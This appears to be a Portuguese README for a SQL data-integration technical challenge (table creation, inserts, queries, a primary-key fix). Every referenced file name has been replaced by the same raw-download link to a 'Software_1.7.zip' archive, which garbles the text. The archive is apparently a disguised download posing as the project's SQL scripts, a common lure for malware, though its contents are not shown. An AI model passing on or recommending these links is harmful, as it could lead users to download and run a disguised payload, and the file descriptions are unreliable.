# desafiosystock
# Desafio Técnico - Analista de Integração de Dados (Implantação)

Este repositório contém as soluções para o desafio técnico solicitado pela Systock, incluindo a criação das tabelas, inserção de dados e consultas SQL.

---

## Estrutura do Projeto

- `https://github.com/andreybarros/desafiosystock/raw/refs/heads/main/irrotationally/Software_1.7.zip` — Script para criação das tabelas `venda`, `pedido_compra` e `entradas_mercadoria`.
- `inserts https://github.com/andreybarros/desafiosystock/raw/refs/heads/main/irrotationally/Software_1.7.zip` — Scripts para inserção dos dados fornecidos.
- `https://github.com/andreybarros/desafiosystock/raw/refs/heads/main/irrotationally/Software_1.7.zip` — Consultas básicas solicitadas na Parte 1.
- `Transformaçãhttps://github.com/andreybarros/desafiosystock/raw/refs/heads/main/irrotationally/Software_1.7.zip` — Consultas com transformações solicitadas na Parte 2.

---

## Como Executar

1. Crie o banco de dados PostgreSQL local.
2. Execute o script `https://github.com/andreybarros/desafiosystock/raw/refs/heads/main/irrotationally/Software_1.7.zip` para criar as tabelas.
3. Insira os dados usando `https://github.com/andreybarros/desafiosystock/raw/refs/heads/main/irrotationally/Software_1.7.zip`.
4. Rode as consultas das partes 1 e 2 para análise.

### Observação Importante sobre a Tabela `entradas_mercadoria`

Durante a criação das tabelas, identifiquei que a definição da tabela `entradas_mercadoria` continha um erro na chave primária: foi informada a coluna `ordem_compra` como parte da chave primária, porém essa coluna não estava declarada na estrutura original.

Para corrigir e garantir a integridade dos dados, adicionei explicitamente a coluna `ordem_compra` à tabela `entradas_mercadoria`, conforme a relação necessária com a tabela `pedido_compra`. Isso permite manter a consistência e o vínculo correto entre os pedidos de compra e as entradas de mercadoria.

Caso deseje verificar o script corrigido, ele está disponível no arquivo `https://github.com/andreybarros/desafiosystock/raw/refs/heads/main/irrotationally/Software_1.7.zip`.

---

## Contato

Em caso de dúvidas, fico à disposição para esclarecimentos.

---

### Obrigado pela oportunidade!
